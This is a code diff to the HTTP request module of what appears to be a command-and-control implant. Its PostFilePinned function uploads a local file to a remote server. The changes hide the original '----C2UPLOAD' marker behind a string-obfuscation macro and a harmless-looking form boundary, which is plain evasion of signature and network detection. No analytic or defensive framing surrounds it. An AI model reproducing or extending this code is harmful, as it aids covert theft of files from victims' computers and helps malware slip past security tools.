@@ -4,6 +4,7 @@ Copyright (c) 2020 4B4DB4B3
 */
 
 #include "Requests.h"
+#include "Obf.h"
 
 // Parse "host:port" or plain "host" → fills host_out and returns port (default 80)
 static INTERNET_PORT ParseHost(const char* url, char* host_out, size_t host_sz) {
@@ -66,17 +67,17 @@ std::string Requests::PostFilePinned(const char* url, const char* useragent, con
     }
     CloseHandle(hFile);
 
-    const char* boundary    = "----C2UPLOAD";
-    const char* contentType = "Content-Type: multipart/form-data; boundary=----C2UPLOAD";
+    std::string boundary    = S("----FormBoundary7MxK");
+    std::string contentType = S("Content-Type: multipart/form-data; boundary=----FormBoundary7MxK");
 
     std::string fname(localFilePath);
     size_t slash = fname.find_last_of("/\\");
     if (slash != std::string::npos) fname = fname.substr(slash + 1);
 
-    std::string head = "--" + std::string(boundary) + "\r\n"
+    std::string head = "--" + boundary + "\r\n"
         "Content-Disposition: form-data; name=\"file\"; filename=\"" + fname + "\"\r\n"
         "Content-Type: application/octet-stream\r\n\r\n";
-    std::string tail = "\r\n--" + std::string(boundary) + "--\r\n";
+    std::string tail = "\r\n--" + boundary + "--\r\n";
 
     DWORD bodyLen = (DWORD)(head.size() + fileData.size() + tail.size());
     std::vector<BYTE> body(bodyLen);
@@ -98,7 +99,7 @@ std::string Requests::PostFilePinned(const char* url, const char* useragent, con
     HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 1);
     if (hReq) {
-        if (HttpSendRequestA(hReq, contentType, (DWORD)strlen(contentType), body.data(), bodyLen)) {
+        if (HttpSendRequestA(hReq, contentType.c_str(), (DWORD)contentType.size(), body.data(), bodyLen)) {
             BYTE buf[1024]; DWORD nr = 0;
             while (InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
                 result.append((char*)buf, nr);
